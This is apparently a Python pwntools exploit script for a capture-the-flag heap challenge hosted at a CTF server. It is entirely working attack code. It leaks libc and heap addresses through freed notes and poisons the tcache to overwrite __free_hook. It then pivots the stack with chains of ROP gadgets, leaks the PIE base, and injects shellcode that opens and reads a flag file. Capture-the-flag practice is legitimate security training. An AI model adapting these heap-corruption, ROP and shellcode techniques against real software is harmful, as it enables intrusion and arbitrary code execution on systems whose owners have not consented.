#!/usr/bin/python3
from pwn import *

context.arch = "amd64"
libc = ELF("./libc.so.6")
r = True

if r:
    p = remote("challs.xmas.htsp.ro", 2007)
else:
    p = process("./chall")
    gdb.attach(p, """

    """)

def store(idx, note, text):
    p.sendlineafter(">", "1")
    p.sendlineafter(":", f"{idx}")
    p.recvuntil(":")
    if len(note) == 8:
        p.send(note)
    else:
        p.sendline(note)

    p.recvuntil(":")  
    if len(text) == 0x80:
        p.send(text)
    else:
        p.sendline(text)

    p.recvuntil("Note (raw): ")
    note = bytes.fromhex(p.recvline()[:-1].decode())
    
    p.recvuntil("Text (raw): ")
    text = bytes.fromhex(p.recvline()[:-1].decode())

    p.recvuntil("IV (raw): ")
    iv = bytes.fromhex(p.recvline()[:-1].decode())

    p.recvuntil("Tag (raw): ")
    tag = bytes.fromhex(p.recvline()[:-1].decode())  

    return (note, text, iv, tag)

def store_2(idx, note, text):
    p.sendlineafter(">", "1")
    p.sendlineafter(":", f"{idx}")
    p.recvuntil(":")
    if len(note) == 8:
        p.send(note)
    else:
        p.sendline(note)

    p.recvuntil(":")  
    if len(text) == 0x80:
        p.send(text)
    else:
        p.sendline(text)


def decrypt(idx):
    p.sendlineafter(">", "2")
    p.sendlineafter(":", f"{idx}")

    p.recvuntil("Note (raw): ")
    note = bytes.fromhex(p.recvline()[:-1].decode())
    
    p.recvuntil("Text (raw): ")
    text = bytes.fromhex(p.recvline()[:-1].decode())

    p.recvuntil("IV (raw): ")
    iv = bytes.fromhex(p.recvline()[:-1].decode())

    p.recvuntil("Tag (raw): ")
    tag = bytes.fromhex(p.recvline()[:-1].decode())  

    return (note, text, iv, tag)

def delete(idx):
    p.sendlineafter(">", "4")
    p.sendlineafter(":", f"{idx}")

def edit(idx, note, text):
    p.sendlineafter(">", "3")
    p.sendlineafter(":", f"{idx}")
    p.recvuntil(":")
    if len(note) == 8:
        p.send(note)
    else:
        p.sendline(note)

    p.recvuntil(":")  
    if len(text) == 0x80:
        p.send(text)
    else:
        p.sendline(text)

# 8, 128, 12, 16 bytes long
def leet(note, text, iv, tag):
    p.sendlineafter(">", "1337")
    p.recvuntil("Note (raw): ")

    for b in note:
        p.sendline(hex(b)[2:])

    p.recvuntil("Text (raw): ")
    for b in text:
        p.sendline(hex(b)[2:])

    p.recvuntil("IV (raw): ")
    for b in iv:
        p.sendline(hex(b)[2:])

    p.recvuntil("Tag (raw): ")
    for b in tag:
        p.sendline(hex(b)[2:])


#for i in range(7):
#store(0, "A", "B")

# note, text, iv, tag = store(1, "A"*8, "B"*8)

for i in range(7):
    store(i, "A"*8, "B"*8)

for i in range(7):
    delete(i)


note2, text2, iv2, tag2 = decrypt(6)
libc_ptr = u64(text2[0:8])
libc.address = libc_ptr - 0x1ebbe0

note, text, iv, tag = decrypt(0)
heap_base = u64(text[0:8]) - 0x15e0


log.info(f"heap_base 0x{heap_base:02x}")
log.info(f"libc_ptr 0x{libc_ptr:02x}")
log.info(f"libc 0x{libc.address:02x}")

# cleanup

for i in range(7):
    store_2(i, b"\x00"*8, b"B"*0x80)

delete(1)
delete(0)

edit(0, p64(libc.symbols['__free_hook']), b"F"*0x80)

#0x000000000005893e: ret; 
ret = libc.address + 0x000000000005893e

#pause()
#store(9, p64(0), b"B"*0x80)


"""
0x000000000005e650: mov rsp, rdx; ret; 
0x000000000003aa76: call qword ptr [rdi];
0x00000000001491a1: push rdi; pop rsp; lea rsi, [rdi + 0x48]; mov rdi, r8; mov rax, qword ptr [rax + 0x18]; jmp rax;

0x0000000000149afa: mov rax, qword ptr [rdi + 0x38]; call qword ptr [rax + 0x10];

0x0000000000150235: mov rdi, qword ptr [rax]; mov rax, qword ptr [rdi + 0x38]; call qword ptr [rax + 8]; 
0x0000000000032b5a: pop rsp; ret; 
0x000000000005893e: ret; 
"""

rdi_buf_loc = heap_base + 0x10d0
new_rdi_val = heap_base + 0x1110

new_rsp_loc = heap_base + 0x7d0

log.info(f"0x{new_rdi_val:02x}")

rdi_buf = b''                                       # 0
rdi_buf += p64(libc.address + 0x0000000000149afa)   # 8     mov rax, qword ptr [rdi + 0x38]; call qword ptr [rax + 0x10];
rdi_buf += p64(new_rdi_val)                         # 0x10
rdi_buf += p64(2)                                   # 0x18
rdi_buf += p64(libc.address + 0x0000000000150235)           # 0x20
rdi_buf += p64(4)                                   # 0x28
rdi_buf += p64(5)                                   # 0x30
rdi_buf += p64(0x424243)                            # 0x38
rdi_buf += p64(rdi_buf_loc + 8)                     # 0x40


rdi_buf += p64(libc.address + 0x0000000000032b5a)   # pop rsp; ret;
rdi_buf += p64(new_rsp_loc)
rdi_buf += p64(0x3)
rdi_buf += p64(libc.address + 0x00000000001491a1)   # push rdi; pop rsp; lea rsi, [rdi + 0x48]; mov rdi, r8; mov rax, qword ptr [rax + 0x18]; jmp rax;
rdi_buf += p64(0x5)
rdi_buf += p64(libc.address + 0x000000000005893e)   # ret :-)
rdi_buf += p64(0x7)
rdi_buf += p64(new_rdi_val + 16)





store(8, p64(libc.symbols['gets']), rdi_buf)



p.sendline("A")

# r14 just happends to be a PIE ptr? lol?

"""
0x000000000010a1e1: mov rax, r14; pop rbp; pop r12; pop r13; pop r14; ret; 
0x0000000000094a4a: mov qword ptr [rdi + 8], rax; ret; 
0x0000000000026b72: pop rdi; ret;
0x000000000004a550: pop rax; ret; 
0x000000000012016a: mov rax, qword ptr [rax + 8]; ret; 
0x00000000000a1a3d: mov rdi, rsi; call rax;
0x000000000005e79f: mov rdx, rdi; mov rdi, rax; cmp rdx, rcx; jae 0x5e78c; mov rax, r8; ret; 
0x0000000000151841: push rax; pop rbx; pop rbp; pop r12; ret;


"""

mov_rax_r14_pop_pop_pop_pop_ret = p64(libc.address + 0x000000000010a1e1)
store_rax_rdi8h_ret = p64(libc.address + 0x0000000000094a4a)
pop_rdi_ret = p64(libc.address + 0x0000000000026b72)
pop_rax_ret = p64(libc.address + 0x000000000004a550)

mov_rax_rax8h_ret = p64(libc.address + 0x000000000012016a)

ropchain = b''
ropchain += mov_rax_r14_pop_pop_pop_pop_ret
ropchain += p64(0x4141414) * 4 # garbage
ropchain += store_rax_rdi8h_ret

ropchain += pop_rdi_ret
ropchain += p64(libc.symbols['__malloc_initialize_hook'])
ropchain += p64(libc.symbols['puts'])

ropchain += pop_rdi_ret
ropchain += p64(heap_base + 0x818 + 8*3)
ropchain += p64(libc.symbols['gets'])
ropchain += p64(0x42)

p.sendline(ropchain)

p.recvuntil("Text: ")
p.recvline()

rip = p64(libc.address + 0x000000000003aa76) # 0x000000000003aa76: call qword ptr [rdi];
p.sendline(rip)

leak = p.recvline()[:-1].ljust(8, b'\x00')
pie_base = u64(leak) - 0x52dd
log.info(f"PIE: 0x{pie_base:02x}")



ropchain_2 = b''
ropchain_2 += pop_rax_ret
ropchain_2 += p64(pie_base + 0x8088 - 8)
ropchain_2 += mov_rax_rax8h_ret

ropchain_2 += p64(libc.address + 0x0000000000151841) # 0x0000000000151841: push rax; pop rbx; pop rbp; pop r12; ret; 

ropchain_2 += p64(1)
ropchain_2 += p64(2)

ropchain_2 += pop_rax_ret
ropchain_2 += p64(libc.address + 0x00000000000491f4) # 0x00000000000491f4: pop r12; pop r13; pop rbp; ret; 
ropchain_2 += p64(libc.address + 0x0000000000083dd1) # 0x0000000000083dd1: mov rdi, rbx; call rax; 
ropchain_2 += p64(0x1)
ropchain_2 += p64(0x2)
ropchain_2 += p64(libc.symbols['gets'])

"""
ropchain_2 += p64(libc.address + 0x0000000000162866) # 0x0000000000162866: pop rdx; pop rbx; ret; 
ropchain_2 += p64(0x1000)
ropchain_2 += p64(0) # garbage
ropchain_2 += p64(libc.address + 0x000000000004a48c) # 0x000000000004a48c: sub rax, rdx; ret;
ropchain_2 += p64(libc.address + 0x00000000000270b1) # 0x00000000000270b1: call rax; 
"""

ropchain_2 += pop_rax_ret
ropchain_2 += p64(pie_base + 0x8088 - 8)
ropchain_2 += mov_rax_rax8h_ret

ropchain_2 += p64(libc.address + 0x0000000000151841) # 0x0000000000151841: push rax; pop rbx; pop rbp; pop r12; ret; 
ropchain_2 += p64(1)
ropchain_2 += p64(2)

ropchain_2 += pop_rax_ret
ropchain_2 += p64(libc.address + 0x00000000000491f4) # 0x00000000000491f4: pop r12; pop r13; pop rbp; ret; 
ropchain_2 += p64(libc.address + 0x0000000000083dd1) # 0x0000000000083dd1: mov rdi, rbx; call rax; 
ropchain_2 += p64(0x1)
ropchain_2 += p64(0x2)
ropchain_2 += p64(libc.address + 0x000000000002b377)

# 0x000000000002b377: call rdi; 
p.sendline(ropchain_2)

code = b''
code += asm(pwnlib.shellcraft.open('/home/ctf/flag.txt'))
code += asm(pwnlib.shellcraft.amd64.linux.syscall('SYS_read', 'rax', 'rsp', 0x100))
code += asm(pwnlib.shellcraft.amd64.linux.syscall('SYS_write', 1, 'rsp', 0x100))
code += b'\xc3'

p.sendline(code)

p.interactive()